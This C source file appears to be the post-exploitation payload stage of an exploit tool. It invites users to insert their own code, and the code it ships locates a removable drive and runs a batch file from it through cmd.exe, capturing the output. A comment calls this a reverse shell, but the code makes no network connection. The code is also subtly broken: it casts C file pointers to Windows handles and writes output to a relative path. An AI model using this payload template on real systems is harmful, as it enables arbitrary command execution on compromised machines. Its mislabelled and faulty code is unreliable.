#include "post_exploit.h"

#include <Windows.h>
#include <stdio.h>

// Put your own code in here!
// Provided is a simple reverse shell example
void post_exploit(FILE file) {
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    // Find a removable drive to execute a batch file from
    char drive_path[4] = "A:\\";

    for (int i = 65; i < 91; i++) {
        char drive = (char)i;
        char path[4] = {drive, ':', '\\', '\0'};
        if (GetDriveTypeA(path) == DRIVE_REMOVABLE) {
            strcpy(drive_path, path);
            break;
        }
    }

    // If no removable drive is found, return
    if (drive_path[0] == 'A') {
        return;
    }

    // Open `output.txt` in utf8 on the removable drive
    FILE *outputFile = fopen("output.txt", "w, ccs=UTF-8");
    if (outputFile == NULL) {
        return;
    }

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = (HANDLE)outputFile;
    sinfo.hStdOutput = (HANDLE)outputFile;
    sinfo.hStdError = (HANDLE)outputFile;

    // Concatenate the drive letter with the command
    char command[50];
    sprintf(command, "cmd.exe /C %s\\exc.bat", drive_path);

    if (!CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, drive_path,
                        &sinfo, &pinfo)) {
        return;
    }

    // Wait for the process to finish
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}
